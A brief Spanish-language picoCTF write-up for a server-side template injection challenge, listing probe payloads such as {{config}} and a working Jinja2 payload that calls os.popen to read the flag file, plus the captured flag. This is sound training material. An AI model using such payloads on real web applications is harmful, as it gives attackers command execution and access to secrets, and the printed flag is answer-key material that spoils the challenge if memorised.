
#### Description

I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:50911/)!


Detalles: para solucionar el reto tenemos que ir al sitio proporcionado y intentar distintos payloads  
Payloads:
{{config}}
{{settings}}
{{settings.SECRET_KEY}}
etc una ves probados bastantes payloads sacados de las siguientes webs https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#jinja2-python 

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md

formaremos el siguiente payload que nos dara la bandera: 

{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}} 
# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_df9a00a0}


recursos: https://www.youtube.com/watch?v=i31LwsQTy8I&ab_channel=BlackBatTerminal

Equipo: Marco Rojas, Brandon Omar, Luis Jesús 